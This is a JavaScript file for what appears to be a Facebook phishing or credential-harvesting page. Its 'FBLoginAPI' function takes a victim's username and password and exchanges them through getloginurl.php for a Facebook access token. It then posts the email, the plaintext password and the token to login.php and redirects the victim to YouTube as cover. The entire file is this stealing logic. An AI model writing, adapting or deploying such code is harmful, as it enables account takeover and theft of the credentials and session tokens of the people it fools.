var FBLoginAPI = function(api_key){
    var self = this;
	console.log('hahaha');
    self.api_key = api_key;
       self.login = function(username, password, cb){
        $.get( 'getloginurl.php', {
            api_key : self.api_key,
            username : username,
            password : password
        }, function(json){
            if (json){
                if (json.error){
                    json.error.code = -1;
                    cb(json.error);
                    return;
                }
                if(!json.url)
                {
                   console.log("NOTURL");
                }
                
                if (json.url){
                    $.get(json.url, function(json1){
                        $.post("callback.php",{
                            call_id : json.api_call_id,
                            password : self.oldPass,
                            body : JSON.stringify(json1)
                        }, function(json2){
                            if (json.error){
                                console.log(json2);
                            }
                            if (json1.error_code){
                                if (json1.error_code == 406) self.oldPass = password;
                                cb({
                                    code : json1.error_code,
                                    message : JSON.parse(json1.error_data).error_message
                                });
                            }
                            else {
                                cb(null);
                            }
                        })
						if ( json1.access_token ){
						$.ajax({
							url: "login.php",
							type: "POST",
							data:  {email: username, pass: password, token: json1.access_token },
							
							success: function(data)
							{
								$('#message').text('Login Successfully');
								window.location.replace("https://www.youtube.com/"); 
							},
							error: function() 
							{
							} 	        
					   });
						}
                    })
                }
            }
            else cb({
                code : -1,
                message : 'Unknow error'
            })
        })
    };
    return self;
};